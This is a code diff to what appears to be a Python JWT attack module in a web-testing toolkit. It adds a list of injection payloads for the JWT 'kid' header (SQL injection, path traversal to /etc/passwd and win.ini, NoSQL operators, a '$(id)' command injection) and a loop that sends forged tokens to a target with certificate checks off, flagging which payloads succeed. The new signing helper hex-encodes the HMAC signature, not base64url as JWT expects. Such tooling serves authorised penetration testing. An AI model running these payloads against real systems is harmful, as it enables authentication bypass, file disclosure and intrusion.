@@ -11,12 +11,17 @@ Attack Techniques:
   7. JWT from JWK endpoint
   8. Cross-tenant JWT manipulation
 """
-import re, json, time, base64, hashlib, hmac
+import base64
+import hashlib
+import hmac
+import json
+import re
+import time
 from typing import Dict, List, Optional, Tuple
 from urllib.parse import urljoin
 
-from tools.log_utils import get_logger
 from tools.http_client import HttpClient
+from tools.log_utils import get_logger
 
 logger = get_logger("jwt_attacker")
 
@@ -27,9 +32,9 @@ except ImportError:
     HAS_PYJWT = False
 
 try:
-    from cryptography.hazmat.primitives import serialization
-    from cryptography.hazmat.primitives.asymmetric import rsa, padding
     from cryptography.hazmat.backends import default_backend
+    from cryptography.hazmat.primitives import serialization
+    from cryptography.hazmat.primitives.asymmetric import padding, rsa
     HAS_CRYPTO = True
 except ImportError:
     HAS_CRYPTO = False
@@ -332,16 +337,60 @@ class JWTAttacker:
             })
 
         if "kid" in header:
-            kid = header["kid"]
+            original_header = dict(header)
             findings.append({
                 "method": "kid_present",
                 "confidence": 0.40,
                 "confirmed": False,
-                "kid": kid,
-                "description": "JWT has 'kid' parameter - potential for path traversal injection",
+                "kid": header["kid"],
+                "description": "JWT has 'kid' parameter - potential for path traversal / SQL injection",
             })
+            kid_injections = [
+                ("sql", "' UNION SELECT 'fakekey' --", "SQLi in kid"),
+                ("sql_mysql", "' UNION SELECT 'fakekey'#", "MySQL SQLi in kid"),
+                ("sql_mssql", "' UNION SELECT 'fakekey'--", "MSSQL SQLi in kid"),
+                ("path_linux", "../../../dev/null", "Linux path traversal in kid"),
+                ("path_win", "..\\..\\..\\windows\\win.ini", "Windows path traversal in kid"),
+                ("path_null", "../../../dev/null%00", "Null byte injection in kid"),
+                ("path_etc", "/etc/passwd", "/etc/passwd in kid"),
+                ("nosqli_mongo", {"$ne": "invalid"}, "NoSQLi $ne in kid"),
+                ("nosqli_gt", {"$gt": ""}, "NoSQLi $gt in kid"),
+                ("cmdi", "$(id)", "Command injection in kid"),
+            ]
+            for inj_type, inj_value, desc in kid_injections:
+                try:
+                    test_header = dict(original_header)
+                    test_header["kid"] = inj_value
+                    test_token = self._encode_token(test_header, payload)
+                    resp = self.sess.get(url, headers={"Authorization": "Bearer %s" % test_token},
+                                        timeout=self.timeout, verify=False)
+                    if resp.status_code not in (401, 403, 500, 502, 503):
+                        findings.append({
+                            "method": "kid_injection",
+                            "confidence": 0.85 if resp.status_code in (200, 302) else 0.60,
+                            "confirmed": resp.status_code in (200, 302),
+                            "kid_injection_type": inj_type,
+                            "kid_value": str(inj_value)[:30],
+                            "status": resp.status_code,
+                            "description": desc,
+                        })
+                        if resp.status_code in (200, 302):
+                            break
+                except Exception as e:
+                    logger.debug("kid injection %s: %s", inj_type, e)
 
         return findings
+
+    def _encode_token(self, header: Dict, payload: Dict) -> str:
+        import hashlib
+        import hmac
+        hdr_b64 = self._b64(json.dumps(header, separators=(",", ":")).encode())
+        pld_b64 = self._b64(json.dumps(payload, separators=(",", ":")).encode())
+        sig = hmac.new(b"dummy", ("%s.%s" % (hdr_b64, pld_b64)).encode(), hashlib.sha256).hexdigest()
+        return "%s.%s.%s" % (hdr_b64, pld_b64, sig)
+
+    def _b64(self, data: bytes) -> str:
+        return base64.urlsafe_b64encode(data).rstrip(b"=").decode()
 
     def _check_jku_x5u(self, token: str, header: Dict, payload: Dict, url: str) -> List[Dict]:
         findings = []
